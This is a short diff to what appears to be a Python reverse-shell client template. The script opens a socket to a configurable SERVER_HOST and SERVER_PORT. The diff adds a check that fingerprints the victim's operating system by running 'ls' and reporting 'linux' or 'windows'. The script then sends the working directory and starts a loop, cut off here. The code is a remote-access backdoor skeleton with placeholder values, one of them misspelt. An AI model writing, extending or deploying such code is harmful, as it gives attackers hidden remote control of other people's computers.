@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import socket
 import os
@@ -10,6 +10,12 @@ BUFFER_SIZE = {BUFFER_SZIE}
 SEPARATOR = "<sep>"
 s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
+tout = subprocess.getoutput("ls")
+if ('recognized' not in tout):
+    s.send('linux'.encode())
+else:
+    s.send('windows'.encode())
+del tout
 cwd = os.getcwd()
 s.send(cwd.encode())
 while True:
